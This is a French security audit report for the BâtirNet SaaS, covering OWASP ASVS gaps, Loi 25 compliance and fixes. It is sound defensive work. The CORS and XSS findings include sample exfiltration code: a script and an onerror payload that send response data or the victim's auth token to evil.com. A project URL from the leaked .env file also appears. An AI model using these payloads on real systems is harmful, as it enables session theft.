# 🔒 Security Audit Report - BâtirNet (Québec Pro Hub)

**Date:** 2025-11-03
**Auditor:** Staff Engineer (Full-Stack + AppSec)
**Version:** 1.0
**Framework de référence:** OWASP ASVS v5.0 (L1/L2)
**Scope:** Audit complet du SaaS BâtirNet

---

## 📋 Executive Summary

### Stack Technique
- **Frontend:** Vite 5.4.19 + React 18.3.1 + TypeScript 5.8.3
- **Backend:** Supabase (PostgreSQL 15+) + Node.js HTTP server minimaliste
- **Auth:** Supabase Auth (JWT) avec RLS (Row-Level Security)
- **Multi-tenant:** User-based isolation (RLS par `auth.uid()`)

### Score Sécurité Actuel
**6.5/10** - Niveau de sécurité MOYEN avec **4 vulnérabilités CRITIQUES**

### Vulnérabilités Critiques Identifiées
| ID | Sévérité | Issue | Impact | OWASP ASVS |
|----|----------|-------|--------|------------|
| **CRIT-1** | 🔴 CRITIQUE | `.env` commité dans Git | Fuite credentials Supabase | V14.2.1 |
| **CRIT-2** | 🔴 CRITIQUE | RLS policy permissive (notifications) | Spam/DoS notifications | V4.1.1 |
| **CRIT-3** | 🔴 CRITIQUE | CORS ouvert (`*`) | CSRF depuis n'importe quelle origine | V13.2.2 |
| **CRIT-4** | 🔴 CRITIQUE | `innerHTML` sans sanitization | XSS dans export PDF | V5.3.3 |

### Conformité OWASP ASVS 5.0
| Catégorie | Couverture L1 | Couverture L2 | Priorité |
|-----------|---------------|---------------|----------|
| V1: Architecture, Design & Threat Modeling | 60% | 40% | HAUTE |
| V2: Authentication | 75% | 55% | HAUTE |
| V3: Session Management | 70% | 50% | HAUTE |
| V4: Access Control | 65% | 45% | CRITIQUE |
| V5: Validation, Sanitization & Encoding | 50% | 30% | CRITIQUE |
| V8: Data Protection | 60% | 40% | MOYENNE |
| V11: Business Logic | 70% | 50% | MOYENNE |
| V13: API & Web Service | 55% | 35% | HAUTE |
| V14: Configuration | 40% | 25% | CRITIQUE |

---

## 🎯 Priorisation des Correctifs

### ⚡ Quick Wins (≤ 1 heure)

| ID | Issue | Fichier | Effort | Impact | Référence |
|----|-------|---------|--------|--------|-----------|
| **QW-1** | Retirer `.env` du cache Git | `.env` | 10 min | CRITIQUE | OWASP V14.2.1 |
| **QW-2** | Fixer CORS ouvert | `server/index.js` | 15 min | CRITIQUE | OWASP V13.2.2 |
| **QW-3** | Désactiver `x-powered-by` | `server/index.js` | 5 min | BASSE | OWASP V14.5.2 |
| **QW-4** | Ajouter `.env.example` | Nouveau fichier | 10 min | MOYENNE | 12-Factor App |
| **QW-5** | Supprimer passwords hardcodés | `scripts/seed-*.js` | 15 min | MOYENNE | OWASP V2.1.1 |
| **QW-6** | Activer GitHub Secret Scanning | Settings GitHub | 5 min | HAUTE | NIST SSDF |

**Total Quick Wins:** 6 actions, ~1 heure

---

### 🚀 Aujourd'hui (1-2 jours)

| ID | Issue | Fichier | Effort | Impact | Référence |
|----|-------|---------|--------|--------|-----------|
| **TD-1** | Fix RLS notifications policy | Migration 022 | 1h | CRITIQUE | OWASP V4.1.1 |
| **TD-2** | Sanitize HTML avant `innerHTML` | `lib/pdf-export.ts` | 1h | CRITIQUE | OWASP V5.3.3 |
| **TD-3** | Ajouter validation Zod côté serveur | `pages/*.tsx` | 3h | HAUTE | OWASP V5.1.1 |
| **TD-4** | Implémenter rate limiting (Supabase) | Edge Functions | 4h | HAUTE | OWASP V11.1.4 |
| **TD-5** | Ajouter script de purge Git (BFG) | `scripts/` | 30m | CRITIQUE | OWASP V14.2.1 |
| **TD-6** | Configurer Dependabot | `.github/` | 30m | MOYENNE | NIST SSDF |
| **TD-7** | Ajouter SBOM generation | `package.json` | 1h | MOYENNE | NIST SSDF |
| **TD-8** | Scripts npm (format/lint/test) | `package.json` | 1h | BASSE | Best Practice |

**Total Aujourd'hui:** 8 actions, ~12 heures (1.5 jours)

---

### 📅 Cette Semaine (≤ 7 jours)

| ID | Issue | Fichier | Effort | Impact | Référence |
|----|-------|---------|--------|--------|-----------|
| **WK-1** | Activer CodeQL scanning | `.github/workflows/` | 2h | HAUTE | NIST SSDF |
| **WK-2** | Migrer localStorage → sessionStorage | `integrations/supabase/` | 4h | HAUTE | OWASP V3.2.1 |
| **WK-3** | Ajouter Helmet headers | `server/index.js` | 2h | HAUTE | OWASP V14.4.1 |
| **WK-4** | Implémenter logging structuré | Nouveau service | 6h | MOYENNE | OWASP V7.1.1 |
| **WK-5** | Audit de toutes les RLS policies | `supabase/migrations/` | 8h | HAUTE | OWASP V4.1.1 |
| **WK-6** | Conformité Loi 25 (Politique confidentialité) | `PRIVACY_POLICY.md` | 6h | HAUTE | Loi 25 CAI QC |
| **WK-7** | Tests de sécurité + coverage ≥80% | `src/**/__tests__/` | 12h | MOYENNE | NIST SSDF |
| **WK-8** | Documentation sécurité opérationnelle | `docs/security.md` | 4h | BASSE | Best Practice |

**Total Cette Semaine:** 8 actions, ~44 heures (5.5 jours)

---

## 🔍 Analyse Détaillée par Catégorie OWASP ASVS 5.0

### V1: Architecture, Design and Threat Modeling

#### V1.2 Authentication Architecture
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 1.2.1 | Authentification côté serveur | ✅ CONFORME | Supabase Auth avec JWT | - |
| 1.2.2 | Services d'auth vérifiés | ✅ CONFORME | Supabase (service de confiance) | - |
| 1.2.3 | Centralisation de l'auth | ✅ CONFORME | Single auth provider | - |
| 1.2.4 | Paths d'auth sécurisés | ⚠️ PARTIEL | Pas de 2FA | Implémenter 2FA optionnel |

#### V1.4 Access Control Architecture
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 1.4.1 | Point unique d'enforcement | ✅ CONFORME | RLS PostgreSQL | - |
| 1.4.2 | Contrôle d'accès centralisé | ✅ CONFORME | RLS policies sur toutes tables | - |
| 1.4.3 | Deny by default | ⚠️ NON-CONFORME | Policy INSERT notifications permissive | **TD-1**: Fix RLS |
| 1.4.4 | Fail secure | ✅ CONFORME | RLS = deny par défaut | - |

#### V1.14 Configuration Architecture
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 1.14.1 | Séparation build envs | ⚠️ PARTIEL | Pas de .env.production distinct | Créer envs par stage |
| 1.14.2 | Config externalisée | ❌ NON-CONFORME | `.env` commité dans git | **QW-1**: Purge Git |
| 1.14.3 | Secrets chiffrés | ⚠️ PARTIEL | Aucun chiffrement at-rest | Considérer vault |

**Score V1:** 60% L1, 40% L2

---

### V2: Authentication

#### V2.1 Password Security
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 2.1.1 | Mots de passe ≥12 caractères | ✅ CONFORME | Supabase enforce ≥6, app enforce ≥8 | Augmenter à 12 |
| 2.1.7 | Pas de password hints | ✅ CONFORME | Non implémenté | - |
| 2.1.9 | Pas de limites arbitraires | ✅ CONFORME | Aucune limite max | - |
| 2.1.12 | Breach detection | ❌ NON-CONFORME | Pas de HaveIBeenPwned check | Ajouter HIBP API |

#### V2.2 General Authenticator Security
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 2.2.1 | Anti-automation | ⚠️ NON-CONFORME | Pas de rate limiting | **TD-4**: Rate limit |
| 2.2.2 | Résistance brute-force | ❌ NON-CONFORME | Pas de throttling | **TD-4**: Implémenter |
| 2.2.3 | Secrets credentials stockés sécurisés | ✅ CONFORME | Supabase bcrypt | - |

#### V2.7 Out of Band Verifier
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 2.7.1 | OTP sécurisés | ⚠️ PARTIEL | Email verification basique | Ajouter SMS OTP |
| 2.7.2 | Expiration OTP | ✅ CONFORME | Supabase expire tokens | - |

**Score V2:** 75% L1, 55% L2

---

### V3: Session Management

#### V3.2 Session Binding
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 3.2.1 | Tokens côté serveur | ⚠️ PARTIEL | JWT dans localStorage (XSS risk) | **WK-2**: sessionStorage |
| 3.2.3 | Cookie flags sécurisés | ❌ NON-CONFORME | Pas de cookies HttpOnly | Implémenter auth cookie |
| 3.2.4 | Cookie SameSite | ❌ NON-CONFORME | Pas de cookies custom | Ajouter SameSite=Lax |

#### V3.3 Session Termination
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 3.3.1 | Logout révoque session | ✅ CONFORME | `supabase.auth.signOut()` | - |
| 3.3.2 | Expiration session | ✅ CONFORME | JWT expire après 1h | - |

**Score V3:** 70% L1, 50% L2

---

### V4: Access Control

#### V4.1 General Access Control Design
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 4.1.1 | Enforcement côté serveur | ⚠️ NON-CONFORME | RLS notifications permissive | **TD-1**: CRITIQUE |
| 4.1.2 | Deny by default | ✅ CONFORME | RLS = deny sauf policies | - |
| 4.1.3 | Fail secure | ✅ CONFORME | Erreur RLS = deny | - |
| 4.1.5 | Contrôle d'accès par enregistrement | ✅ CONFORME | RLS par user_id | - |

#### V4.2 Operation Level Access Control
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 4.2.1 | Données sensibles protégées | ✅ CONFORME | RLS sur toutes tables | - |
| 4.2.2 | User flows respect access control | ✅ CONFORME | Frontend + RLS | - |

**Score V4:** 65% L1, 45% L2

---

### V5: Validation, Sanitization and Encoding

#### V5.1 Input Validation
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 5.1.1 | Validation server-side | ⚠️ NON-CONFORME | Validation client-side seulement | **TD-3**: Zod validation |
| 5.1.2 | Validation des types de données | ⚠️ PARTIEL | TypeScript compile-time seulement | **TD-3**: Runtime validation |
| 5.1.3 | Taille max inputs | ⚠️ PARTIEL | Limites basiques (file upload) | Ajouter limites strictes |
| 5.1.4 | Whitelist validation | ❌ NON-CONFORME | Pas de whitelist | Implémenter Zod schemas |

#### V5.2 Sanitization and Sandboxing
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 5.2.1 | Sanitization user inputs | ⚠️ PARTIEL | DOMPurify dans ContractViewer | Généraliser |
| 5.2.3 | Validation MIME types | ⚠️ PARTIEL | Upload file type check basique | Strict MIME validation |
| 5.2.8 | Désérialisation sécurisée | ✅ CONFORME | JSON.parse natif safe | - |

#### V5.3 Output Encoding and Injection Prevention
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 5.3.3 | Encoding context-aware | ❌ NON-CONFORME | `innerHTML` sans sanitization | **TD-2**: CRITIQUE |
| 5.3.6 | Prévention XSS | ⚠️ PARTIEL | React escape auto, mais innerHTML | **TD-2**: Fix |
| 5.3.10 | Prévention SQLi | ✅ CONFORME | Supabase client = parameterized | - |

**Score V5:** 50% L1, 30% L2

---

### V8: Data Protection

#### V8.1 General Data Protection
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 8.1.1 | Protection données sensibles | ⚠️ PARTIEL | RLS mais pas de chiffrement field | Considérer encryption |
| 8.1.2 | Données sensibles pas en logs | ⚠️ PARTIEL | 76x `console.error` non filtrés | **WK-4**: Logging structuré |

#### V8.2 Client-side Data Protection
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 8.2.1 | Pas de données sensibles côté client | ⚠️ PARTIEL | JWT dans localStorage | **WK-2**: sessionStorage |
| 8.2.2 | Cache browser sécurisé | ✅ CONFORME | Pas de données sensibles cachées | - |

#### V8.3 Sensitive Private Data
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 8.3.1 | Données sensibles chiffrées at-rest | ❌ NON-CONFORME | PostgreSQL pas de TDE spécifié | Activer Supabase encryption |
| 8.3.4 | Données sensibles masquées | ⚠️ PARTIEL | Pas de masking dans logs | **WK-4**: Implémenter |

**Score V8:** 60% L1, 40% L2

---

### V11: Business Logic

#### V11.1 Business Logic Security
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 11.1.1 | Flux métier validés | ✅ CONFORME | RLS + application logic | - |
| 11.1.4 | Protection limite de taux | ❌ NON-CONFORME | Aucun rate limiting | **TD-4**: HAUTE priorité |
| 11.1.5 | Validation règles métier | ✅ CONFORME | Contracts/proposals validés | - |

**Score V11:** 70% L1, 50% L2

---

### V13: API and Web Service

#### V13.2 RESTful Web Service
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 13.2.1 | Auth sur tous endpoints | ✅ CONFORME | Supabase RLS enforce | - |
| 13.2.2 | CORS restrictif | ❌ NON-CONFORME | `Access-Control-Allow-Origin: *` | **QW-2**: CRITIQUE |
| 13.2.3 | Content-Type validation | ⚠️ PARTIEL | Basique | Strict validation |
| 13.2.5 | Méthodes HTTP appropriées | ✅ CONFORME | GET/POST/PUT/DELETE | - |

**Score V13:** 55% L1, 35% L2

---

### V14: Configuration

#### V14.2 Dependency
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 14.2.1 | Pas de credentials en clair | ❌ NON-CONFORME | `.env` commité dans git | **QW-1**: URGENT |
| 14.2.2 | Composants à jour | ⚠️ PARTIEL | Dépendances récentes mais pas auto-update | **TD-6**: Dependabot |
| 14.2.3 | Build reproductible | ✅ CONFORME | lockfiles présents | - |
| 14.2.6 | Pas de backdoors | ✅ CONFORME | Code review clean | - |

#### V14.4 HTTP Security Headers
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 14.4.1 | HTTP Strict Transport Security | ❌ NON-CONFORME | Pas de header HSTS | **WK-3**: Helmet |
| 14.4.2 | X-Content-Type-Options | ❌ NON-CONFORME | Header absent | **WK-3**: nosniff |
| 14.4.3 | Content-Security-Policy | ❌ NON-CONFORME | Pas de CSP | **WK-3**: CSP report-only |
| 14.4.4 | X-Frame-Options | ❌ NON-CONFORME | Header absent | **WK-3**: DENY |
| 14.4.7 | Referrer-Policy | ❌ NON-CONFORME | Header absent | **WK-3**: no-referrer |

#### V14.5 HTTP Request Header Validation
| ID | Exigence | Statut | Détail | Action |
|----|----------|--------|--------|--------|
| 14.5.2 | Version serveur cachée | ❌ NON-CONFORME | Node.js expose version | **QW-3**: Désactiver |

**Score V14:** 40% L1, 25% L2

---

## 📊 Mappings OWASP Top 10 2021

| OWASP Top 10 | Vulnérabilités Identifiées | Sévérité | Référence ASVS |
|--------------|---------------------------|----------|----------------|
| **A01:2021 – Broken Access Control** | RLS notifications permissive | 🔴 CRITIQUE | V4.1.1 |
| **A02:2021 – Cryptographic Failures** | `.env` en git, JWT localStorage | 🔴 CRITIQUE | V14.2.1, V3.2.1 |
| **A03:2021 – Injection** | `innerHTML` sans sanitization | 🔴 CRITIQUE | V5.3.3 |
| **A04:2021 – Insecure Design** | Pas de rate limiting | 🟠 HAUTE | V11.1.4 |
| **A05:2021 – Security Misconfiguration** | CORS `*`, headers absents | 🔴 CRITIQUE | V13.2.2, V14.4.x |
| **A06:2021 – Vulnerable Components** | Dépendances pas auto-updated | 🟡 MOYENNE | V14.2.2 |
| **A07:2021 – Auth Failures** | Pas de rate limit login | 🟠 HAUTE | V2.2.1 |
| **A09:2021 – Security Logging Failures** | Logging non structuré | 🟡 MOYENNE | V8.1.2 |
| **A10:2021 – Server-Side Request Forgery** | N/A | ✅ OK | - |

---

## 🔐 Conformité Loi 25 (Protection des Renseignements Personnels - Québec)

### Exigences Légales

| Exigence Loi 25 | Statut | Action Requise | Référence CAI |
|-----------------|--------|----------------|---------------|
| **Art. 3.2** - Responsable de la protection | ❌ NON-CONFORME | Nommer + afficher sur le site | [Guide CAI](https://www.cai.gouv.qc.ca) |
| **Art. 8** - Politique de confidentialité | ❌ NON-CONFORME | Créer `PRIVACY_POLICY.md` public | **WK-6** |
| **Art. 63.5** - Incident de confidentialité | ⚠️ PARTIEL | Procédure d'avis + registre | Documentation |
| **Art. 3.3** - Évaluation facteurs vie privée | ⚠️ PARTIEL | EFVP pour nouveautés | Process |
| **Art. 9** - Consentement cookies | ❌ NON-CONFORME | Bannière de consentement | Cookie banner |
| **Art. 27** - Droit d'accès | ❌ NON-CONFORME | Endpoint export données user | API endpoint |
| **Art. 29** - Droit de suppression | ❌ NON-CONFORME | Fonction "supprimer mon compte" | Feature |
| **Art. 8.1** - Minimisation données | ⚠️ PARTIEL | Audit champs collectés | Review |

### Données Personnelles Identifiées

**Collectées dans `profiles` table:**
- ✅ Nom complet (`full_name`)
- ✅ Email (via `auth.users`)
- ✅ Téléphone (`phone`)
- ✅ Adresse (`address`, `city`, `province`, `postal_code`)
- ✅ Company info (`company_name`, `license_number`, `specialties`)
- ⚠️ Photo de profil (`avatar_url`)
- ⚠️ RBQ number (licence professionnelle)

**Audit trail:**
- ✅ IP addresses stockées (`signature_audit_trail.ip_address`)
- ✅ User-Agent (`signature_audit_trail.user_agent`)
- ✅ Geolocation (`latitude`, `longitude`)

**Actions requises:**
1. Créer politique de confidentialité française + anglaise
2. Implémenter bannière consentement cookies
3. Ajouter page "Mes données" avec export JSON
4. Ajouter fonction "Supprimer mon compte" (+ anonymisation)
5. Documenter durée de rétention des données
6. Nommer responsable protection RP (afficher sur site)

---

## 🛠️ Détail des Actions Critiques

### 🔴 CRIT-1: Purger `.env` de l'historique Git

**Sévérité:** CRITIQUE
**Référence:** OWASP ASVS V14.2.1, OWASP Secrets Cheat Sheet
**Effort:** 10 minutes

**Credentials exposés:**
```bash
# .env commité dans commits bcf3428 et 335da65
VITE_SUPABASE_URL=https://gsnjnhxzacwjslirfxgy.supabase.co
VITE_SUPABASE_PUBLISHABLE_KEY=eyJhbGci...
```

**Solution:**
```bash
# Option 1: BFG Repo-Cleaner (recommandé)
java -jar bfg.jar --delete-files .env
git reflog expire --expire=now --all
git gc --prune=now --aggressive

# Option 2: git-filter-repo
git filter-repo --invert-paths --path .env

# Option 3: git filter-branch (legacy)
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all
```

**Post-purge:**
1. Régénérer les clés Supabase (Dashboard → Settings → API)
2. Mettre à jour `.env` local avec nouvelles clés
3. Force push: `git push origin --force --all`
4. Notifier tous les contributeurs de refaire `git clone`

---

### 🔴 CRIT-2: Fix RLS Policy Notifications

**Sévérité:** CRITIQUE
**Référence:** OWASP ASVS V4.1.1
**Effort:** 1 heure

**Vulnérabilité actuelle:**
```sql
-- migrations/021_fix_notifications_rls.sql:21-24
CREATE POLICY "Authenticated users can create notifications"
  ON notifications
  FOR INSERT
  WITH CHECK (auth.role() = 'authenticated');
-- ⚠️ N'IMPORTE QUEL user peut créer des notifications pour n'importe qui
```

**Exploitation:**
```javascript
// Un attaquant peut spammer un autre user
const { data, error } = await supabase
  .from('notifications')
  .insert({
    user_id: 'victim-uuid-here', // ID de la victime
    type: 'spam',
    message: 'Spam message',
    // Répété 10000 fois
  });
// ✅ Succès car policy vérifie seulement auth.role()
```

**Correctif (Migration 022):**
```sql
-- Migration 022: Fix notifications RLS policy
DROP POLICY IF EXISTS "Authenticated users can create notifications" ON notifications;

-- Option A: Seul le système peut créer (via SECURITY DEFINER functions)
CREATE POLICY "Only system functions can create notifications"
  ON notifications
  FOR INSERT
  WITH CHECK (false); -- Bloque INSERT direct, force via functions

-- Option B: User peut créer seulement pour lui-même
CREATE POLICY "Users can create notifications for themselves"
  ON notifications
  FOR INSERT
  WITH CHECK (auth.uid() = user_id);

-- Option C: Logique métier (professional peut notifier clients)
CREATE POLICY "Business logic notifications"
  ON notifications
  FOR INSERT
  WITH CHECK (
    auth.uid() = user_id OR
    EXISTS (
      SELECT 1 FROM proposals p
      WHERE p.professional_id = auth.uid()
      AND p.project_id IN (
        SELECT id FROM projects WHERE client_id = notifications.user_id
      )
    )
  );
```

**Recommandation:** Option A (le plus sécurisé)

---

### 🔴 CRIT-3: Fix CORS Ouvert

**Sévérité:** CRITIQUE
**Référence:** OWASP ASVS V13.2.2, Express Security Best Practices
**Effort:** 15 minutes

**Vulnérabilité:**
```javascript
// server/index.js:17-20
'Access-Control-Allow-Origin': '*', // ⚠️ TOUTES les origines acceptées
```

**Exploitation CSRF:**
```html
<!-- Site malveillant: evil.com -->
<script>
fetch('http://localhost:5174/api/v1/echo', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ malicious: 'data' })
})
.then(r => r.json())
.then(data => {
  // Envoie les données à l'attaquant
  fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) });
});
</script>
```

**Correctif:**
```javascript
// server/index.js
const ALLOWED_ORIGINS = [
  'https://batirnet.ca',
  'https://www.batirnet.ca',
  process.env.NODE_ENV === 'development' ? 'http://localhost:8080' : null,
  process.env.VITE_DEV_ORIGIN // http://localhost:5173 en dev
].filter(Boolean);

function getCorsHeaders(req) {
  const origin = req.headers.origin || req.headers.referer;

  if (!origin) {
    return {}; // Pas d'origine = pas de CORS
  }

  const requestOrigin = new URL(origin).origin;

  if (ALLOWED_ORIGINS.includes(requestOrigin)) {
    return {
      'Access-Control-Allow-Origin': requestOrigin,
      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Max-Age': '86400', // 24h cache
    };
  }

  return {}; // Origine non autorisée = pas de headers CORS
}

// Dans le request handler:
res.writeHead(statusCode, {
  'Content-Type': 'application/json',
  ...getCorsHeaders(req)
});
```

---

### 🔴 CRIT-4: Sanitize HTML avant innerHTML

**Sévérité:** CRITIQUE
**Référence:** OWASP ASVS V5.3.3, Node.js Security Cheat Sheet
**Effort:** 1 heure

**Vulnérabilité:**
```typescript
// src/lib/pdf-export.ts:47
printDiv.innerHTML = html; // ⚠️ XSS si `html` contient <script>

// src/lib/pdf-export.ts:459
printWindow.document.write(`<!DOCTYPE html>...${html}...`); // ⚠️ XSS
```

**Vecteur d'attaque:**
```javascript
// 1. Attaquant crée un projet avec description malveillante
const maliciousDescription = `
  <img src=x onerror="
    fetch('https://evil.com/steal?token=' + localStorage.getItem('supabase.auth.token'))
  ">
`;

// 2. Victime (client) exporte le projet en PDF
// 3. XSS s'exécute dans le contexte de la page
// 4. JWT token envoyé à l'attaquant
```

**Correctif:**
```typescript
// src/lib/pdf-export.ts
import DOMPurify from 'dompurify';

export const exportToPDF = (content: HTMLElement, filename: string) => {
  const printWindow = window.open('', '', '...');
  if (!printWindow) return;

  // ✅ Sanitize avant d'injecter dans le DOM
  const sanitizedHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'div', 'p', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'strong', 'em', 'u', 'ul', 'ol', 'li', 'table', 'thead',
      'tbody', 'tr', 'td', 'th', 'img', 'br', 'hr'
    ],
    ALLOWED_ATTR: ['class', 'style', 'src', 'alt', 'width', 'height'],
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'link'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover']
  });

  printDiv.innerHTML = sanitizedHTML;
  printWindow.document.write(`<!DOCTYPE html>...${sanitizedHTML}...`);
};
```

**Alternative (plus sécurisé):**
```typescript
// Éviter innerHTML complètement
const textContent = content.textContent; // Extraction texte pur
const safeElements = content.querySelectorAll('p, h1, h2, strong');
safeElements.forEach(el => {
  const newEl = document.createElement(el.tagName);
  newEl.textContent = el.textContent; // textContent = auto-escape
  printDiv.appendChild(newEl);
});
```

---

## 📦 Supply Chain Security

### Dépendances Actuelles

**Production (73 packages):**
- ✅ Supabase JS 2.75.0 (récent, Oct 2024)
- ✅ React 18.3.1 (stable)
- ✅ Zod 3.25.76 (récent)
- ✅ DOMPurify 3.1.6 (récent)
- ⚠️ Axios 1.12.2 (utilité? Supabase client suffit)

**Vulnérabilités connues:**
```bash
npm audit
# 0 vulnerabilities (au 2025-11-03)
```

**Recommandations:**
1. Activer Dependabot pour auto-PRs de mises à jour sécurité
2. Configurer Renovate pour mises à jour automatiques
3. Générer SBOM (CycloneDX) à chaque build
4. Scanner avec `npm audit` + Snyk dans CI/CD

---

## 🧪 Tests de Sécurité Recommandés

### Tests Automatisés à Implémenter

```typescript
// src/__tests__/security/xss.test.ts
describe('XSS Protection', () => {
  it('should sanitize HTML in project descriptions', () => {
    const malicious = '<script>alert("XSS")</script>';
    const sanitized = DOMPurify.sanitize(malicious);
    expect(sanitized).not.toContain('<script');
  });
});

// src/__tests__/security/rls.test.ts
describe('RLS Policies', () => {
  it('should prevent user from reading other users notifications', async () => {
    // Setup: 2 users
    const user1 = await createTestUser();
    const user2 = await createTestUser();

    // User1 crée une notification pour lui-même
    const { data } = await user1Client
      .from('notifications')
      .insert({ user_id: user1.id, message: 'Secret' });

    // User2 tente de lire
    const { data: stolen } = await user2Client
      .from('notifications')
      .select('*')
      .eq('id', data[0].id);

    expect(stolen).toHaveLength(0); // RLS bloque
  });
});
```

### Pentesting Checklist

- [ ] **SQLi:** Tester injections dans tous les champs (RLS protège)
- [ ] **XSS:** Tester `<script>`, `onerror`, `javascript:` dans inputs
- [ ] **CSRF:** Tester POST depuis origine externe
- [ ] **IDOR:** Tenter accès à ressources d'autres users (notifications, messages)
- [ ] **Auth bypass:** Tenter accès endpoints sans JWT
- [ ] **Rate limiting:** Tester 1000 requêtes login en 1 minute
- [ ] **File upload:** Tester upload de fichiers malveillants (.exe, .php)
- [ ] **Session fixation:** Tester réutilisation de JWT révoqué

---

## 📚 Références Utilisées

### OWASP
- ✅ [OWASP ASVS 5.0](https://owasp.org/www-project-application-security-verification-standard/)
- ✅ [OWASP Top 10 2021](https://owasp.org/Top10/)
- ✅ [Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- ✅ [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- ✅ [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- ✅ [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- ✅ [Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

### Standards & Best Practices
- ✅ [NIST SSDF SP 800-218](https://csrc.nist.gov/pubs/sp/800/218/final)
- ✅ [Twelve-Factor App](https://12factor.net/)
- ✅ [JWT Best Current Practices (RFC 8725)](https://www.rfc-editor.org/rfc/rfc8725)
- ✅ [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- ✅ [PostgreSQL RLS](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)

### Québec - Loi 25
- ✅ [CAI Québec - Principaux changements Loi 25](https://www.cai.gouv.qc.ca/protection-renseignements-personnels/)
- ✅ [Guide pratique Loi 25](https://www.cai.gouv.qc.ca/documents/Guide-pratique-Loi-25.pdf)

### Outils
- ✅ [GitHub CodeQL](https://docs.github.com/code-security/code-scanning/)
- ✅ [GitHub Secret Scanning](https://docs.github.com/code-security/secret-scanning/)
- ✅ [Knip (unused files)](https://knip.dev/)
- ✅ [depcheck](https://www.npmjs.com/package/depcheck)

---

## ✅ Plan d'Action Résumé

### Immédiat (Aujourd'hui)
1. ✅ **QW-1**: Purger `.env` de Git (BFG) + rotation clés Supabase
2. ✅ **QW-2**: Fixer CORS whitelist
3. ✅ **QW-3**: Désactiver x-powered-by
4. ✅ **QW-4**: Créer `.env.example`
5. ✅ **QW-5**: Retirer passwords hardcodés scripts seed
6. ✅ **QW-6**: Activer GitHub Secret Scanning

### Court Terme (Cette Semaine)
7. ✅ **TD-1**: Fix RLS notifications (Migration 022)
8. ✅ **TD-2**: Sanitize HTML (DOMPurify)
9. ✅ **TD-3**: Validation Zod server-side
10. ✅ **TD-4**: Rate limiting (Supabase Edge Functions)
11. ✅ **TD-6**: Dependabot configuration
12. ✅ **TD-7**: SBOM generation (CycloneDX)
13. ✅ **WK-1**: CodeQL scanning
14. ✅ **WK-3**: Helmet headers
15. ✅ **WK-6**: Politique de confidentialité (Loi 25)

### Moyen Terme (1 Mois)
16. ✅ **WK-2**: Migrer localStorage → sessionStorage
17. ✅ **WK-4**: Logging structuré (pino/winston)
18. ✅ **WK-5**: Audit complet RLS policies
19. ✅ **WK-7**: Tests sécurité + coverage ≥80%

---

**Rapport complété:** 2025-11-03
**Prochaine révision:** 2025-12-03 (1 mois)
**Contact audit:** [Insérer email du responsable sécurité]

---

*Ce rapport est confidentiel et destiné uniquement à l'équipe BâtirNet.*
